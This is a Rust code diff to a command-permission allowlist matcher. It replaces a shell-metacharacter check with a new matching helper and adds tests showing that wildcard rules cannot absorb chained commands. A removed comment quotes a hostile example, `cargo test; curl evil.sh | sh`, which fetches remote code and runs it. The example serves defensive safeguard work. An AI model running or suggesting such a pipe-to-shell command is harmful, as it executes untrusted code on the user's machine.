@@ -5,7 +5,7 @@
 //! data, never in the repository. The record is bound to the current repository
 //! fingerprint by [`super::approval_store`], so a checkout change re-prompts.
 
-use super::glob_match::wildcard_match;
+use super::glob_match::command_wildcard_match;
 use serde::{Deserialize, Serialize};
 use std::path::Path;
 
@@ -97,26 +97,14 @@ pub fn match_rule(
         let matched = if exact {
             pattern == command || pattern == approval_key
         } else {
-            (wildcard_match(pattern, command) && metachars_covered(pattern, command))
-                || (wildcard_match(pattern, approval_key)
-                    && metachars_covered(pattern, approval_key))
+            command_wildcard_match(pattern, command)
+                || command_wildcard_match(pattern, approval_key)
         };
         matched.then(|| MatchedCommandRule {
             pattern: pattern.to_string(),
             exact,
         })
     })
-}
-
-/// Commands run under `sh -c`, so shell metacharacters chain further commands.
-/// A wildcard rule must not auto-approve metachars its pattern never contained
-/// — `cargo *` must not cover `cargo test; curl evil.sh | sh`. Any metachar in
-/// the command must appear literally in the pattern; otherwise the command
-/// falls back to the normal permission prompt (or an exact approval).
-fn metachars_covered(pattern: &str, command: &str) -> bool {
-    const META: [char; 11] = [';', '&', '|', '`', '$', '>', '<', '(', ')', '\n', '\r'];
-    META.iter()
-        .all(|c| !command.contains(*c) || pattern.contains(*c))
 }
 
 fn read_allowlist(
@@ -308,6 +296,19 @@ mod tests {
         }
         // Plain tails still match.
         assert!(match_rule(&rules, "cargo test --all", "cargo test --all").is_some());
+    }
+
+    #[test]
+    fn wildcard_cannot_consume_additional_shell_syntax() {
+        for (pattern, command) in [
+            ("npm run build && npm test *", "npm run build && npm test --watch && printf unapproved"),
+            ("echo * | cat", "echo ok | printf unapproved | cat"),
+            ("echo ?", "echo ;"),
+            ("echo *", "echo 'unterminated"),
+            ("echo *", "echo ok\\"),
+        ] {
+            assert!(match_rule(&[pattern.to_string()], command, command).is_none(), "accepted {command}");
+        }
     }
 
     #[test]
